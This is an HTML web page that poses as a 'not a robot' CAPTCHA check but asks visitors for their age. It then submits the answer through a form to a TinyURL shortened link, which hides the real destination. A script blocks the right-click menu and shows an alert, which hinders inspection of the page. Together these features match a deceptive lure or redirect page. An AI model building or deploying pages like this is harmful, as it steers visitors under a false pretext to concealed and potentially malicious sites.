<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm You're Not a Robot</title>
    <script type="text/javascript">
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault(); // Prevents the right-click menu from showing
            alert("Right-click is disabled on this page!"); // Optional alert message
        });
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        h1 {
            margin-bottom: 20px;
            color: #333;
        }
        .captcha-box {
            margin-bottom: 15px;
        }
        input[type="text"] {
            padding: 10px;
            width: 100%;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Confirm Your Age Here to Continue</h1>
        <p>Please Enter Your Age</p>
        <div class="captcha-box">
            <p>What is your age?</p>
        </div>
        <form action="https://tinyurl.com/3cxrfts9" method="GET">
            <input type="text" name="captcha" placeholder="Enter Age Here" required="">
            <button type="submit">Verify</button>
        </form>
    </div>


</body></html>
